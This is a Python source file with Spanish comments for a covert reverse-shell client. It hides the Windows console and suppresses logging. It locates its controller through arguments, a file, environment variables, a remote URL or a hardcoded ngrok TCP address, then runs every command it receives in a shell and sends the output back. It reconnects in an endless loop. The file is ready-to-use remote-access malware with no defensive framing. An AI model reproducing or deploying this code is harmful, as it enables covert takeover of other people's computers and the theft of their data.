import socket
import subprocess
import sys
import ctypes
import os
import time
import argparse
import logging
from logging import NullHandler
import signal

# Control de ejecución
running = True

def handle_exit(signum=None, frame=None):
    global running
    running = False
    logger.info("Señal de salida recibida, cerrando cliente...")

signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

# Ocultar consola en Windows
def hide_console():
    if os.name != "nt":
        return
    try:
        import ctypes
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


# Logging silencioso

logger = logging.getLogger("vicen_client")
logger.setLevel(logging.CRITICAL)  # solo muestra errores graves si llegaran a pasar
logger.addHandler(NullHandler())   # evita que se creen archivos o salidas

# Stop flag (para apagar)

STOP_FLAG = os.path.join(os.path.dirname(__file__), 'stop.flag')

# Asegurar instalación de requests

def ensure_requests_installed():
    try:
        return True
    except Exception:
        try:
            cmd = [sys.executable, "-m", "pip", "install", "requests", "--disable-pip-version-check", "--quiet"]
            subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except Exception:
            return False

# Cliente principal

def start_client(server_ip, server_port):
    global running
    while running:
        if os.path.exists(STOP_FLAG):
            break
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10)
            client.connect((server_ip, server_port))
            client.settimeout(1.0)
            break
        except Exception:
            try:
                client.close()
            except Exception:
                pass
            time.sleep(5)

    try:
        while running:
            try:
                data = client.recv(4096)
            except socket.timeout:
                if os.path.exists(STOP_FLAG):
                    try:
                        client.close()
                    except Exception:
                        pass
                    return
                continue
            except Exception:
                break

            if not data:
                break

            command = data.decode(errors='ignore')
            cmd = command.strip()
            if not cmd:
                continue

            if cmd.lower() == "exit":
                break

            if cmd.lower() == "getip":
                if 'requests' in globals():
                    try:
                        r = requests.get("https://api64.ipify.org?format=json", timeout=5)
                        output = r.json().get('ip', '')
                    except Exception as e:
                        output = f"ERROR: {e}"
                else:
                    output = "ERROR: requests no disponibles"
                client.send(output.encode())
                continue

            if cmd.lower().startswith("cd "):
                path = cmd[3:].strip().strip('"')
                try:
                    os.chdir(path)
                    output = os.getcwd()
                except Exception as e:
                    output = str(e)
                client.send(output.encode())
                continue

            if cmd.lower() == "cd" or cmd.lower() == "pwd":
                client.send(os.getcwd().encode())
                continue

            if cmd.lower().startswith("ls") or cmd.lower().startswith("list"):
                parts = command.split(None, 1)
                path = parts[1].strip().strip('"') if len(parts) > 1 else os.getcwd()
                try:
                    entries = os.listdir(path)
                    lines = []
                    for e in entries:
                        full = os.path.join(path, e)
                        if os.path.isdir(full):
                            lines.append(f"<DIR> {e}")
                        else:
                            lines.append(f"      {e}")
                    output = "\r\n".join(lines) if lines else "(empty)"
                except Exception as ex:
                    output = str(ex)
                client.send(output.encode())
                continue

            # Fallback: ejecutar comando en shell
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e)
            try:
                client.send(output.encode(errors='ignore'))
            except Exception:
                break
    finally:
        try:
            client.close()
        except Exception:
            pass

# Main

if __name__ == "__main__":
    hide_console()

    # Check/install solo instala si es necesario
    have_requests = ensure_requests_installed()
    if have_requests:
        try:
            import requests 
        except Exception:
            pass

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('host', nargs='?')
    parser.add_argument('port', nargs='?')
    parser.add_argument('--endpoint-url', dest='endpoint_url', nargs='?', help='URL that returns host:port')
    args = parser.parse_args()

    def discover_endpoint():
        # 1) argumentos CLI
        if args.host and args.port:
            try:
                return args.host, int(args.port)
            except Exception:
                pass

        # 2) conexión local vía endpoint.txt
        try:
            local = os.path.join(os.path.dirname(__file__), 'endpoint.txt')
            if os.path.exists(local):
                txt = open(local, 'r', encoding='utf-8').read().strip()
                if txt.startswith('tcp://'):
                    txt = txt[len('tcp://'):]
                if ':' in txt:
                    h, p = txt.split(':', 1)
                    return h.strip(), int(p.strip())
        except Exception:
            pass

        # 3) variables de entorno
        env_ip = os.environ.get('SERVER_IP')
        env_port = os.environ.get('SERVER_PORT')
        if env_ip and env_port:
            try:
                return env_ip, int(env_port)
            except Exception:
                pass

        # 4) URL remoto del endpoint vía ENDPOINT_URL o --endpoint-url
        endpoint_url = args.endpoint_url or os.environ.get('ENDPOINT_URL')
        if endpoint_url and have_requests:
            try:
                import requests
                r = requests.get(endpoint_url, timeout=5)
                txt = r.text.strip()
                if txt.startswith('tcp://'):
                    txt = txt[len('tcp://'):]
                if ':' in txt:
                    h, p = txt.split(':', 1)
                    return h.strip(), int(p.strip())
            except Exception:
                pass

        # HARDCODING FIJO PARA NGROK
        # hay que cambiar cada vez que se levanta ngrok
        # levantar ngrok con .\ngrok tcp 5555
        ip = '0.tcp.sa.ngrok.io'
        port = 14974
        return ip, port

    host, port = discover_endpoint()
    print(f"[+] Connecting to {host}:{port} (no args required)")

    # bucle conectandose hasta desconectar desde server
    while True:
        try:
            start_client(host, port)
        except Exception:
            pass
        if not running:
            break
        print('[!] Disconnected; retrying in 5s...')
        time.sleep(5)
